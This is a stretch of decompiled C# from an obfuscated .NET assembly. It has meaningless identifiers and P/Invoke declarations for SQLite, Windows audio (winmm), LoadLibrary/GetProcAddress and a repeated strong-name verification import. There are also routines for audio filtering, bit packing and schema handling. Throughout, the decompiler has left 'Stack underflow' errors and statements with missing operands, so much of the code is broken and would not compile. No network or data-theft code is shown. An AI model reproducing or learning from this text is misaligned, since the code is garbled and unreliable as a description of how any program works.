			{
				_0091_0002._009D_0005(obj);
			}
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static global::_0014._0008 _0001(string _0002)
		{
			//IL_0052: Incompatible stack heights: 0 vs 1
			//IL_0059: Incompatible stack heights: 0 vs 1
			_0018._0001();
			((IEnumerable<global::_0014._0008>)/*Error near IL_0059: Stack underflow*/).GetEnumerator();
			IEnumerator<global::_0014._0008> enumerator = (IEnumerator<global::_0014._0008>)/*Error near IL_005c: Stack underflow*/;
			try
			{
				while (global::_001B._007E_0086_0003(enumerator))
				{
					global::_0014._0008 current = enumerator.Current;
					if (_0010_0003._008B_0006(current._0001._0001, _0002))
					{
						return current;
					}
				}
			}
			finally
			{
				if (enumerator != null)
				{
					global::_0008._007E_0098(enumerator);
				}
			}
			return null;
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static _001D._0016 _0001(float _0002, float _0003, float _0004)
		{
			//IL_0013: Incompatible stack heights: 0 vs 3
			//IL_0016: Incompatible stack heights: 0 vs 1
			//IL_0019: Incompatible stack heights: 0 vs 1
			new _001D._0016();
			_0018._0001((_001D._0016)/*Error near IL_0011: Stack underflow*/, (float)/*Error near IL_0011: Stack underflow*/, (float)/*Error near IL_0011: Stack underflow*/, (float)/*Error near IL_0011: Stack underflow*/);
			return (_001D._0016)/*Error near IL_0012: Stack underflow*/;
		}

		static void _0001(_001C._0004 _0002, int _0003, global::_0016._0007 P_2)
		{
			//IL_005b: Incompatible stack heights: 0 vs 1
			//IL_005e: Incompatible stack heights: 0 vs 1
			//IL_0065: Incompatible stack heights: 0 vs 1
			global::_0005._0014 obj = ((global::_0016._0007)/*Error near IL_0009: Stack underflow*/)._0001;
			_0018._0001((int)/*Error near IL_0065: Stack underflow*/, obj);
			IntPtr intPtr = (IntPtr)/*Error near IL_000c: Stack underflow*/;
			int count = _0003 * P_2._0003;
			int num = _0002.Read(P_2._0001, 0, count);
			if (num == 0)
			{
				P_2._0001 = _001C._0005._0001;
			}
			_0088_0005._0017_000F(P_2._0001, 0, intPtr, num);
			int num2 = num / P_2._0003;
			_0018._0001(num2, P_2._0001, global::_000F._000F._0001);
		}

		static int[] _0001(_0080._0004 _0002)
		{
			//IL_0009: Incompatible stack heights: 0 vs 1
			return ((_0080._0004)/*Error near IL_0007: Stack underflow*/)._0001;
		}

		[DllImport("SQLite.Interop.dll", EntryPoint = "sqlite3_index_column_info_interop")]
		static extern _0080._0017 _0001(IntPtr _0002, byte[] _0003, byte[] _0004, byte[] _0005, ref int _0006, ref int _0007, ref IntPtr _0008, ref int _000E);

		static void _0001(float _0002, _001D._0014 P_1)
		{
			//IL_0007: Invalid comparison between Unknown and F4
			//IL_003a: Incompatible stack heights: 0 vs 1
			//IL_003d: Incompatible stack heights: 0 vs 1
			//IL_0040: Incompatible stack heights: 0 vs 1
			if (!((float)/*Error near IL_0009: Stack underflow*/ >= 1E-09f))
			{
				_0002 = 1E-09f;
			}
			((_001D._0014)/*Error near IL_0019: Stack underflow*/)._000E = (float)/*Error near IL_0019: Stack underflow*/;
			P_1._0010 = (1f + P_1._000E) * (1f - P_1._0005);
		}

		static string _0001()
		{
			//IL_0021: Incompatible stack heights: 0 vs 2
			//IL_0028: Incompatible stack heights: 0 vs 1
			_ = global::_000F._008B_0002;
			_0086_0005._0015_000F(Environment.SpecialFolder.CommonApplicationData);
			string text = global::_0015._0001._000E;
			/*Error near IL_0028: Stack underflow*/((string)/*Error near IL_0028: Stack underflow*/, text);
			return (string)/*Error near IL_001a: Stack underflow*/;
		}

		static IEnumerable<global::_0014._0002> _0001()
		{
			//IL_000d: Incompatible stack heights: 0 vs 1
			_0018._0001(global::_0004._0003._0005);
			return (IEnumerable<global::_0014._0002>)/*Error near IL_0008: Stack underflow*/;
		}

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_enable_load_extension")]
		static extern _0080._0017 _0001(IntPtr _0002, int _0003);

		static bool _0001(_001E._0004 _0002, int P_1)
		{
			//IL_001f: Incompatible stack heights: 0 vs 2
			//IL_0022: Incompatible stack heights: 0 vs 2
			//IL_0029: Incompatible stack heights: 0 vs 1
			_ = global::_0007._0097;
			_ = ((_001E._0004)/*Error near IL_000c: Stack underflow*/)._0001;
			((global::_0013._0005)/*Error near IL_0029: Stack underflow*/)._0001((int)/*Error near IL_0029: Stack underflow*/, out _0019._0002 obj);
			/*Error near IL_0017: Stack underflow*/((int)/*Error near IL_0017: Stack underflow*/);
			return (obj & _0019._0002._0002) == _0019._0002._0002;
		}

		static bool _0001(_001B._0004 _0002, int _0003, _001E._0004 P_2)
		{
			//IL_000e: Incompatible stack heights: 0 vs 2
			//IL_0011: Incompatible stack heights: 0 vs 1
			//IL_0014: Incompatible stack heights: 0 vs 1
			_ = 1;
			return _0018._0001((global::_0017._0005)/*Error near IL_000c: Stack underflow*/, (_001B._0004)/*Error near IL_000c: Stack underflow*/, (_001E._0004)/*Error near IL_000c: Stack underflow*/, (int)/*Error near IL_000c: Stack underflow*/);
		}

		static string _0001(byte[] _0002)
		{
			//IL_0016: Incompatible stack heights: 0 vs 1
			//IL_0019: Incompatible stack heights: 0 vs 3
			//IL_0020: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0004: Stack underflow*/ == 0)
			{
				return null;
			}
			_ = _0013_0003._007E_008F_0006;
			_ = _001C._0018._0001;
			/*Error near IL_0020: Stack underflow*/((object)/*Error near IL_0020: Stack underflow*/, (byte[])/*Error near IL_0020: Stack underflow*/);
			return (string)/*Error near IL_0015: Stack underflow*/;
		}

		static void _0001(byte[] _0002, short[] _0003, global::_0017._007F._0007._0001 P_2)
		{
			//IL_0013: Incompatible stack heights: 0 vs 1
			//IL_0016: Incompatible stack heights: 0 vs 1
			//IL_0019: Incompatible stack heights: 0 vs 1
			((global::_0017._007F._0007._0001)/*Error near IL_0009: Stack underflow*/)._0002 = (short[])/*Error near IL_0009: Stack underflow*/;
			((global::_0017._007F._0007._0001)/*Error near IL_0011: Stack underflow*/)._0001 = _0002;
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static global::_0005._0003 _0001(bool _0002, Stream _0003)
		{
			//IL_00ec: Incompatible stack heights: 0 vs 1
			//IL_00f8: Incompatible stack heights: 0 vs 1
			new global::_0005._0003();
			global::_0005._0003 obj = (global::_0005._0003)/*Error near IL_00f2: Stack underflow*/;
			long num = global::_0012._007E_0091_0002(_0003);
			((global::_0005._0003)/*Error near IL_001f: Stack underflow*/).FileOffset = num;
			byte[] array = new byte[4];
			if (_0082._007E_0006_0004(_0003, array, 0, array.Length) < array.Length)
			{
				return null;
			}
			while (!_0018._0001(array, obj))
			{
				array[0] = array[1];
				array[1] = array[2];
				array[2] = array[3];
				if (_0082._007E_0006_0004(_0003, array, 3, 1) < 1)
				{
					return null;
				}
				obj.FileOffset++;
			}
			int num2 = obj.FrameLength - 4;
			if (_0002)
			{
				obj.RawData = new byte[obj.FrameLength];
				_0098_0002._000F_0006(array, obj.RawData, 4);
				if (_0082._007E_0006_0004(_0003, obj.RawData, 4, num2) < num2)
				{
					throw new EndOfStreamException(_0080._0014._0001(107348353));
				}
			}
			else
			{
				_007F_0002._007E_0083_0005(_0003, _0003.Position + num2);
			}
			return obj;
		}

		static float _0001(global::_000E._001A _0002, int P_1)
		{
			//IL_002d: Incompatible stack heights: 0 vs 1
			//IL_0030: Incompatible stack heights: 0 vs 1
			//IL_0037: Incompatible stack heights: 0 vs 1
			_0080._0014._0001(107348288);
			((global::_000E._001A)/*Error near IL_0010: Stack underflow*/)._0001((int)/*Error near IL_0010: Stack underflow*/, (string)/*Error near IL_0010: Stack underflow*/);
			global::_0007._0097(_0002._0001._0001((uint)P_1, out var result));
			return result;
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static void _0001(global::_0017._007F._0002 _0002, int P_1)
		{
			//IL_000d: Unknown result type (might be due to invalid IL or missing references)
			//IL_000e: Unknown result type (might be due to invalid IL or missing references)
			//IL_0014: Expected I4, but got Unknown
			//IL_0024: Incompatible stack heights: 0 vs 1
			//IL_0027: Incompatible stack heights: 0 vs 1
			//IL_002a: Incompatible stack heights: 0 vs 2
			_ = ((global::_0017._007F._0002)/*Error near IL_0009: Stack underflow*/)._0001;
			_003F val = /*Error near IL_000e: Stack underflow*/& 0x1F;
			_003F val2 = /*Error near IL_000f: Stack underflow*/>> (int)val;
			((global::_0017._007F._0002)/*Error near IL_0014: Stack underflow*/)._0001 = (uint)(int)val2;
			_0002._0003 -= P_1;
		}

		static IList<global::_0013._0010> _0001(global::_0016._0014 _0002, IList<global::_0013._0010> P_1)
		{
			//IL_0022: Incompatible stack heights: 0 vs 1
			//IL_0028: Incompatible stack heights: 0 vs 1
			new List<global::_0013._0010>();
			List<global::_0013._0010> list = (List<global::_0013._0010>)/*Error near IL_0025: Stack underflow*/;
			if ((int)/*Error near IL_0008: Stack underflow*/ != 0)
			{
				list.AddRange(P_1);
			}
			_0002._0001.Add(list);
			return list;
		}

		static void _0001(global::_0017._007F._0007 P_0)
		{
			//IL_00e6: Incompatible stack heights: 0 vs 1
			//IL_00ec: Incompatible stack heights: 0 vs 2
			int i = default(int);
			if (0 == 0)
			{
				i = 0;
			}
			for (; i < P_0._000E; i++)
			{
				_ = ((global::_0017._007F._0007)/*Error near IL_0017: Stack underflow*/)._0002;
				int num = ((byte[])/*Error near IL_001d: Stack underflow*/)[/*Error near IL_001d: Stack underflow*/] & 0xFF;
				int num2 = P_0._0001[i];
				if (num2-- != 0)
				{
					int num3 = _0018._0001(num, P_0);
					_0018._0001(P_0._0001, num3);
					int num4 = (num3 - 261) / 4;
					if (num4 > 0 && num4 <= 5)
					{
						_0018._0001(P_0._0001, num & ((1 << num4) - 1), num4);
					}
					int num5 = _0018._0001(P_0, num2);
					_0018._0001(P_0._0002, num5);
					num4 = num5 / 2 - 1;
					if (num4 > 0)
					{
						_0018._0001(P_0._0001, num2 & ((1 << num4) - 1), num4);
					}
				}
				else
				{
					_0018._0001(P_0._0001, num);
				}
			}
			_0018._0001(P_0._0001, 256);
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		[DllImport("winmm.dll", EntryPoint = "mmioStringToFOURCC")]
		static extern int _0001([MarshalAs(UnmanagedType.LPStr)] string _0002, int _0003);

		static IEnumerable<_001C._000F> _0001(Guid _0002)
		{
			//IL_0011: Incompatible stack heights: 0 vs 3
			new _001B._0013._0001(-2);
			((_001B._0013._0001)/*Error near IL_000f: Stack underflow*/)._0002 = (Guid)/*Error near IL_000f: Stack underflow*/;
			return (IEnumerable<_001C._000F>)/*Error near IL_0010: Stack underflow*/;
		}

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_stmt_readonly")]
		static extern int _0001(IntPtr _0002);

		[DllImport("SQLite.Interop.dll", EntryPoint = "sqlite3_context_collcompare_interop")]
		static extern int _0001(IntPtr _0002, byte[] _0003, int _0004, byte[] _0005, int _0006);

		static float[] _0001(float[] _0002, global::_0001._0016 _0003, float[] P_2)
		{
			//IL_0008: Unknown result type (might be due to invalid IL or missing references)
			//IL_0056: Incompatible stack heights: 0 vs 1
			//IL_0059: Incompatible stack heights: 0 vs 2
			_ = ((Array)/*Error near IL_0003: Stack underflow*/).Length;
			IntPtr intPtr = (nint)((Array)/*Error near IL_0007: Stack underflow*/).LongLength;
			float[] array = new float[/*Error near IL_0009: Stack underflow*/ + (int)(nint)intPtr];
			for (int i = 0; i < array.Length; i++)
			{
				for (int j = 0; j < P_2.Length; j++)
				{
					if (i >= j && i - j < _0002.Length)
					{
						array[i] += P_2[j] * _0002[i - j];
					}
				}
			}
			_0018._0001(_0003, array);
			return array;
		}

		static void _0001(_001F._0019 P_0)
		{
			//IL_009f: Incompatible stack heights: 0 vs 1
			if (((_001F._0019)/*Error near IL_000a: Stack underflow*/)._0001)
			{
				return;
			}
			_001F._0019._0003 obj = null;
			for (int i = 0; i < P_0._0001.Length; i++)
			{
				if (P_0._0001[i]._0001 == null || P_0._0001[i]._0001 != obj)
				{
					obj = P_0._0001[i]._0001;
					if (obj != null)
					{
						_0018._0001(obj, P_0._0001._0001._0002(P_0._0001, P_0._0001[i]._0003));
					}
				}
			}
			P_0._0001 = true;
		}

		static double _0001(double _0002, int _0003)
		{
			//IL_0015: Unknown result type (might be due to invalid IL or missing references)
			//IL_0017: Expected F8, but got Unknown
			//IL_0018: Incompatible stack heights: 0 vs 1
			//IL_001b: Incompatible stack heights: 0 vs 3
			//IL_0022: Incompatible stack heights: 0 vs 1
			_ = global::_0014._0095_0002;
			_ = 2.0;
			double num = (double)/*Error near IL_0013: Stack underflow*/;
			/*Error near IL_0022: Stack underflow*/((double)/*Error near IL_0022: Stack underflow*/, num);
			return /*Error near IL_0016: Stack underflow*/* /*Error near IL_0016: Stack underflow*/;
		}

		static int _0001(DbType _0002)
		{
			//IL_000a: Incompatible stack heights: 0 vs 2
			_ = global::_0001._001A._0001;
			return ((int[])/*Error near IL_0008: Stack underflow*/)[/*Error near IL_0008: Stack underflow*/];
		}

		static void _0001(int _0002, int _0003, _001E._0007 P_2)
		{
			//IL_0003: Invalid comparison between Unknown and I4
			//IL_000e: Invalid comparison between Unknown and I4
			//IL_004c: Incompatible stack heights: 0 vs 1
			//IL_004f: Incompatible stack heights: 0 vs 1
			//IL_0052: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0005: Stack underflow*/ >= 0)
			{
				int num = ((_001E._0007)/*Error near IL_000e: Stack underflow*/)._0002;
				if ((int)/*Error near IL_0010: Stack underflow*/ < num)
				{
					if (_0003 < 0 || _0003 >= P_2._0001)
					{
						throw new ArgumentException(_0080._0014._0001(107359813));
					}
					P_2._0001[_0003] = _0002;
					return;
				}
			}
			throw new ArgumentException(_0080._0014._0001(107359842));
		}

		static global::_0017._007F._0004 _0001(global::_0017._007F._0005 P_0)
		{
			//IL_0032: Incompatible stack heights: 0 vs 1
			//IL_0038: Incompatible stack heights: 0 vs 1
			byte[] array = new byte[((global::_0017._007F._0005)/*Error near IL_0007: Stack underflow*/)._000E];
			byte[] array2 = default(byte[]);
			if (0 == 0)
			{
				array2 = array;
			}
			Array.Copy(((global::_0017._007F._0005)/*Error near IL_0017: Stack underflow*/)._0002, P_0._0008, array2, 0, P_0._000E);
			return new global::_0017._007F._0004(array2);
		}

		unsafe static void _0001(ref double _0002, _001D._000E _0003, [Out] int _0004, [Out] byte[] _0005, ref double P_4)
		{
			//IL_00c4: Incompatible stack heights: 0 vs 1
			//IL_00ca: Incompatible stack heights: 0 vs 1
			//IL_00d0: Incompatible stack heights: 0 vs 2
			if (((_001D._000E)/*Error near IL_000a: Stack underflow*/)._0002 == 4)
			{
				_ = _0018_0003._0094_0006;
				float num = /*Error near IL_0022: Stack underflow*/((byte[])/*Error near IL_0022: Stack underflow*/, _0004);
				*(double*)(nint)/*Error near IL_0024: Stack underflow*/ = num;
				if (_0003._0001 > 1)
				{
					P_4 = _0018_0003._0094_0006(_0005, _0004 + _0003._0002);
				}
				else
				{
					P_4 = _0002;
				}
				return;
			}
			if (_0003._0002 == 2)
			{
				_0002 = (double)_0080_0002._0086_0005(_0005, _0004) / 32768.0;
				if (_0003._0001 > 1)
				{
					P_4 = (double)_0080_0002._0086_0005(_0005, _0004 + _0003._0002) / 32768.0;
				}
				else
				{
					P_4 = _0002;
				}
				return;
			}
			throw new InvalidOperationException(_0008_0002._0007_0005(_0080._0014._0001(107348271), _0003._0002));
		}

		static void _0001(global::_000E._0005 P_0)
		{
			//IL_006b: Incompatible stack heights: 0 vs 2
			//IL_0072: Incompatible stack heights: 0 vs 1
			//IL_0075: Incompatible stack heights: 0 vs 1
			_ = _0090_0002._009A_0005;
			IntPtr intPtr = ((global::_000E._0005)/*Error near IL_000c: Stack underflow*/)._0001;
			IntPtr zero = IntPtr.Zero;
			/*Error near IL_0072: Stack underflow*/(intPtr, zero);
			if ((int)/*Error near IL_0015: Stack underflow*/ != 0)
			{
				return;
			}
			_0018._0001(((global::_000E._0005)/*Error near IL_001d: Stack underflow*/)._0001);
			if (P_0._0001 != null)
			{
				for (int i = 0; i < P_0._0001.Length; i++)
				{
					P_0._0001[i]._0002();
				}
				P_0._0001 = null;
			}
			_0018._0001(P_0._0001);
			P_0._0001 = IntPtr.Zero;
		}

		static void _0001(global::_0017._007F._000E _0002, int _0003, int P_2)
		{
			//IL_001d: Unknown result type (might be due to invalid IL or missing references)
			//IL_001e: Unknown result type (might be due to invalid IL or missing references)
			//IL_0024: Expected I4, but got Unknown
			//IL_009c: Incompatible stack heights: 0 vs 1
			//IL_00a2: Incompatible stack heights: 0 vs 1
			//IL_00a8: Incompatible stack heights: 0 vs 2
			_ = ((global::_0017._007F._000E)/*Error near IL_000f: Stack underflow*/)._0001;
			int num = _0002._0003;
			_003F val = /*Error near IL_001e: Stack underflow*/<< num;
			_003F val2 = /*Error near IL_001f: Stack underflow*/| val;
			((global::_0017._007F._000E)/*Error near IL_0024: Stack underflow*/)._0001 = (uint)(int)val2;
			_0002._0003 += P_2;
			if (_0002._0003 >= 16)
			{
				_0002._0001[_0002._0002++] = (byte)_0002._0001;
				_0002._0001[_0002._0002++] = (byte)(_0002._0001 >> 8);
				_0002._0001 >>= 16;
				_0002._0003 -= 16;
			}
		}

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_win32_reset_heap")]
		static extern _0080._0017 _0001();

		static string _0001(Type _0002, Guid _0003)
		{
			//IL_00d6: Incompatible stack heights: 0 vs 2
			//IL_00e0: Incompatible stack heights: 0 vs 1
			_ = _0089_0006._007E_001E_0010;
			/*Error near IL_00e0: Stack underflow*/((object)/*Error near IL_00e0: Stack underflow*/, BindingFlags.Static | BindingFlags.Public);
			FieldInfo[] array = (FieldInfo[])/*Error near IL_00e6: Stack underflow*/;
			foreach (FieldInfo fieldInfo in array)
			{
				if (!global::_001B._007E_0092_0003(fieldInfo) || !global::_001B._007E_0093_0003(fieldInfo) || (object)_001D_0003._007E_009B_0006(fieldInfo) != _0091._0080_0004(typeof(Guid).TypeHandle) || !_0094_0002._0004_0006((Guid)_0086_0004._007E_0098_0008(fieldInfo, null), _0003))
				{
					continue;
				}
				object[] array2 = _008A_0006._007E_001F_0010(fieldInfo, false);
				for (int j = 0; j < array2.Length; j++)
				{
					if (array2[j] is global::_0007._0010 obj)
					{
						return obj.Description;
					}
				}
				return global::_0002._007E_0016(fieldInfo);
			}
			return _0003.ToString();
		}

		static void _0001(int _0002, _0080._0007 P_1)
		{
			//IL_0017: Incompatible stack heights: 0 vs 1
			//IL_001a: Incompatible stack heights: 0 vs 1
			//IL_001d: Incompatible stack heights: 0 vs 1
			byte[] obj2 = _0018._0001(_0003: ((_0080._0007)/*Error near IL_000b: Stack underflow*/)._0001, _0002: (int)/*Error near IL_0010: Stack underflow*/);
			((_0080._0007)/*Error near IL_0015: Stack underflow*/)._0001 = obj2;
		}

		static void _0001(_001D._0019 _0002, DataTable P_1)
		{
			//IL_00bd: Incompatible stack heights: 0 vs 3
			//IL_00c7: Incompatible stack heights: 0 vs 1
			//IL_00d1: Incompatible stack heights: 0 vs 1
			_ = _0081_0006._007E_0017_0010;
			_ = _0002_0005._007E_008B_000E;
			/*Error near IL_00c7: Stack underflow*/((object)/*Error near IL_00c7: Stack underflow*/);
			string isUnique = SchemaTableColumn.IsUnique;
			/*Error near IL_00d1: Stack underflow*/((object)/*Error near IL_00d1: Stack underflow*/, isUnique);
			DataColumn dataColumn = (DataColumn)/*Error near IL_001f: Stack underflow*/;
			DataColumn dataColumn2 = _0081_0006._007E_0017_0010(_0002_0005._007E_008B_000E(P_1), SchemaTableColumn.IsKey);
			IEnumerator enumerator = _0014_0005._007E_009B_000E(_0006_0005._007E_008F_000E(P_1));
			try
			{
				while (global::_001B._007E_0086_0003(enumerator))
				{
					DataRow dataRow = (DataRow)_0083_0003._007E_001D_0007(enumerator);
					if (!(bool)_0082_0006._007E_0018_0010(dataRow, dataColumn2))
					{
						_008B_0006._007E_007F_0010(dataRow, dataColumn, false);
					}
				}
			}
			finally
			{
				if (enumerator is IDisposable disposable)
				{
					global::_0008._007E_0098(disposable);
				}
			}
			global::_0008._007E_0013_0002(P_1);
		}

		[DllImport("winmm.dll", EntryPoint = "waveOutSetVolume")]
		static extern MmResult _0001(IntPtr _0002, int _0003);

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_last_insert_rowid")]
		static extern long _0001(IntPtr _0002);

		[DllImport("kernel32.dll", EntryPoint = "GetProcAddress")]
		static extern IntPtr _0001(IntPtr _0002, string _0003);

		[DllImport("winmm.dll", EntryPoint = "midiInUnprepareHeader")]
		static extern MmResult _0001(IntPtr _0002, [MarshalAs(UnmanagedType.Struct)] ref global::_0018._0012._0007 _0003, int _0004);

		static string _0001(byte[] _0002)
		{
			//IL_0045: Incompatible stack heights: 0 vs 1
			//IL_004c: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0004: Stack underflow*/ == 0)
			{
				return null;
			}
			new StringBuilder();
			StringBuilder stringBuilder = (StringBuilder)/*Error near IL_004f: Stack underflow*/;
			int num = _0002.Length;
			for (int i = 0; i < num; i++)
			{
				_008C_0002._007E_0095_0005(stringBuilder, _0080._0014._0001(107348226), _0002[i]);
			}
			return global::_0002._007E_0006(stringBuilder);
		}

		static bool _0001()
		{
			//IL_0028: Incompatible stack heights: 0 vs 2
			//IL_002f: Incompatible stack heights: 0 vs 1
			_ = _008C_0006._007E_0080_0010;
			_008D._0019_0004();
			/*Error near IL_002f: Stack underflow*/((object)/*Error near IL_002f: Stack underflow*/);
			PlatformID platformID = (PlatformID)/*Error near IL_0032: Stack underflow*/;
			if (platformID == PlatformID.Win32S || platformID == PlatformID.Win32Windows || platformID == PlatformID.Win32NT || platformID == PlatformID.WinCE)
			{
				return true;
			}
			return false;
		}

		static void _0001(global::_000E._0019 _0002, double P_1)
		{
			//IL_01cc: Incompatible stack heights: 0 vs 1
			//IL_01d8: Incompatible stack heights: 0 vs 1
			int num = ((global::_000E._0019)/*Error near IL_000a: Stack underflow*/)._0008;
			int num2 = ((global::_000E._0019)/*Error near IL_0019: Stack underflow*/)._000F;
			if (_0002._0006 == P_1 && _0002._0003 == num && _0002._0007 == num2)
			{
				return;
			}
			_0002._0007 = num2;
			_0002._0006 = P_1;
			int num3 = (num + 1) * _0002._0007;
			Array.Resize(ref _0002._0002, num3);
			if (_0002._0002.Length == num3)
			{
				_0002._0003 = num;
				int num4 = num * _0002._0007;
				int num5 = num4 / 2;
				double num6 = 0.0;
				double num7 = 0.0;
				double num8 = Math.PI * 2.0 / (double)num4;
				double num9 = Math.PI / (double)_0002._0007 * P_1;
				double num10 = num9 * (double)(-num5);
				for (int i = -num5; i < num5 + _0002._0007; i++)
				{
					double num11 = 287.0 / 800.0 - 0.48829 * global::_0015._009A_0002(num7) + 0.14128 * global::_0015._009A_0002(2.0 * num7) - 0.01168 * global::_0015._009A_0002(6.0 * num7);
					if (i != 0)
					{
						num11 *= global::_0015._009B_0002(num10) / num10;
					}
					num7 += num8;
					num10 += num9;
					_0002._0002[num5 + i] = (float)num11;
					if (i < num5)
					{
						num6 += num11;
					}
				}
				num6 = (double)_0002._0007 / num6;
				for (int i = 0; i < num4 + _0002._0007; i++)
				{
					_0002._0002[i] = (float)((double)_0002._0002[i] * num6);
				}
			}
			else
			{
				_0002._0003 = 0;
			}
		}

		static void _0001(global::_0017._007F._0002 P_0)
		{
			//IL_0015: Unknown result type (might be due to invalid IL or missing references)
			//IL_001b: Expected I4, but got Unknown
			//IL_002c: Incompatible stack heights: 0 vs 1
			//IL_002f: Incompatible stack heights: 0 vs 1
			//IL_0032: Incompatible stack heights: 0 vs 2
			_ = ((global::_0017._007F._0002)/*Error near IL_0009: Stack underflow*/)._0001;
			int num = ((global::_0017._007F._0002)/*Error near IL_0010: Stack underflow*/)._0003;
			_003F val = /*Error near IL_0016: Stack underflow*/>> (num & 7);
			((global::_0017._007F._0002)/*Error near IL_001b: Stack underflow*/)._0001 = (uint)(int)val;
			P_0._0003 &= -8;
		}

		static void _0001(BinaryReader _0002, _001E._0010 P_1)
		{
			//IL_002a: Incompatible stack heights: 0 vs 1
			//IL_002d: Incompatible stack heights: 0 vs 1
			//IL_0034: Incompatible stack heights: 0 vs 1
			_0018._0001((BinaryReader)/*Error near IL_0034: Stack underflow*/);
			((_001E._0010)/*Error near IL_000b: Stack underflow*/)._0001 = (_001F._0013)/*Error near IL_000b: Stack underflow*/;
			P_1._0002 = _0018._0001(_0002);
			P_1._0001 = global::_001A._007E_001D_0003(_0002);
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static Guid _0001(_001B._0014 P_0)
		{
			//IL_0022: Incompatible stack heights: 0 vs 2
			//IL_0029: Incompatible stack heights: 0 vs 1
			Guid empty = Guid.Empty;
			_ = global::_0007._0097;
			((_001B._0014)/*Error near IL_0013: Stack underflow*/)._0001._0001(out empty);
			/*Error near IL_001c: Stack underflow*/((int)/*Error near IL_001c: Stack underflow*/);
			return empty;
		}

		static void _0001(_001D._0010 P_0)
		{
			//IL_000a: Incompatible stack heights: 0 vs 1
			((_001D._0010)/*Error near IL_0008: Stack underflow*/)._0001 = true;
		}

		[DllImport("kernel32", BestFitMapping = false, CharSet = CharSet.Auto, EntryPoint = "LoadLibrary", SetLastError = true, ThrowOnUnmappableChar = true)]
		static extern IntPtr _0001(string _0002);

		static void _0001(string _0002, global::_0008._0001 P_1)
		{
			//IL_00d7: Incompatible stack heights: 0 vs 1
			//IL_00dd: Incompatible stack heights: 0 vs 4
			//IL_00e7: Incompatible stack heights: 0 vs 1
			try
			{
				_ = _0017_0005._0001_000F;
				_ = global::_0002._007E_000F;
				_ = global::_000E._007E_008A_0002;
				char[] obj = new char[1] { '>' };
				/*Error near IL_00e7: Stack underflow*/((object)/*Error near IL_00e7: Stack underflow*/, obj);
				object obj2 = ((object[])/*Error near IL_002d: Stack underflow*/)[0];
				string text = /*Error near IL_0032: Stack underflow*/(obj2);
				short num = /*Error near IL_0037: Stack underflow*/(text);
				((global::_0008._0001)/*Error near IL_003c: Stack underflow*/)._0004 = num;
				while (P_1._0001 && P_1._0007)
				{
					global::_0002._0001 obj3 = P_1._0001;
					int num2 = P_1._0004;
					P_1._0001 = _0018._0001(num2, obj3);
					_007F_0002._007E_0084_0005(P_1._0001, 0L);
					_0087._007E_0012_0004(P_1._0001, P_1._0001, _0086._0011_0004());
					_0018._0001(P_1, _0088._007E_0013_0004(P_1._0001), global::_0002._007E_0006(_0080._0014._0001(107348249)), false);
				}
			}
			catch
			{
			}
		}

		static void _0001(_0014 P_0)
		{
			//IL_0018: Incompatible stack heights: 0 vs 1
			//IL_0022: Incompatible stack heights: 0 vs 1
			_0018._0001((_0014)/*Error near IL_001f: Stack underflow*/);
			SQLiteConnectionFlags num = _0018._0001(P_0._0001);
			((_0014)/*Error near IL_0016: Stack underflow*/)._0001 = num;
		}

		static void _0001(int _0002, global::_0015._0008 P_1)
		{
			//IL_0024: Incompatible stack heights: 0 vs 1
			//IL_0027: Incompatible stack heights: 0 vs 1
			//IL_002a: Incompatible stack heights: 0 vs 2
			if (((global::_0015._0008)/*Error near IL_0007: Stack underflow*/)._0001 != null)
			{
				_ = ((global::_0015._0008)/*Error near IL_0010: Stack underflow*/)._0001.Length;
				if (/*Error near IL_0016: Stack underflow*/ >= /*Error near IL_0016: Stack underflow*/)
				{
					return;
				}
			}
			P_1._0001 = new byte[_0002];
		}

